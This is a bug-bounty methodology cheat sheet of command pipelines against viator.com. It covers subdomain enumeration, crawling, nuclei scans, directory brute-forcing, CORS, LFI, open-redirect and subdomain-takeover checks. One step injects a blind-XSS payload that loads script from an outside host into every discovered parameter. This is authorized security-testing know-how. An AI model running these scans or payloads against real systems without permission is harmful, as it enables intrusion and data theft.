CoffinSP
### Bug Hunting Methodology Part 2 by Lostsec

#### 1. **Subdomain Enumeration**
   - Use **Subfinder** to discover subdomains:
     ```bash
     subfinder -d viator.com -all -recursive > subdomain.txt
     ```

#### 2. **Check Live Subdomains**
   - Verify which subdomains are alive with **httpx-toolkit**:
     ```bash
     cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
     ```

#### 3. **URL Discovery**
   - Use **Katana** to find URLs and filter for specific sources:
     ```bash
     katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
     ```

#### 4. **Filter for Sensitive Files**
   - Extract URLs that may contain sensitive information:
     ```bash
     cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
     ```

#### 5. **JavaScript URL Collection**
   - Collect JavaScript files for further analysis:
     ```bash
     cat allurls.txt | grep -E "\.js$" > js.txt
     ```

#### 6. **Run Nuclei for Exposures**
   - Scan JavaScript files with **Nuclei** for exposure vulnerabilities:
     ```bash
     cat js.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/
     ```

#### 7. **Additional JavaScript Exposure Checks**
   - Check the main domain’s JavaScript files:
     ```bash
     echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
     ```

#### 8. **Directory Scanning**
   - Use **Dirsearch** to find potential misconfigurations:
     ```bash
     dirsearch -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,lock,log,rar,old,sql,sql.gz,txt,zip,.xml
     ```

#### 9. **Cross-Site Scripting (XSS) Testing**
   - Search for XSS vulnerabilities:
     ```bash
     subfinder -d viator.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
     ```

#### 10. **Subdomain Scanning with Subzy**
   - Use **Subzy** to identify additional vulnerabilities:
     ```bash
     subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
     ```

#### 11. **CORS Testing**
   - Check for CORS misconfigurations:
     ```bash
     python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
     ```

#### 12. **Nuclei CORS and CVE Checks**
   - Run **Nuclei** against alive subdomains for specific tags:
     ```bash
     nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors
     nuclei -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
     ```

#### 13. **Local File Inclusion (LFI) Testing**
   - Scan URLs for LFI vulnerabilities:
     ```bash
     cat allurls.txt | gf lfi | nuclei -tags lfi
     ```

#### 14. **Open Redirect Testing**
   - Use **OpenRedirex** to find open redirects:
     ```bash
     cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
     ```
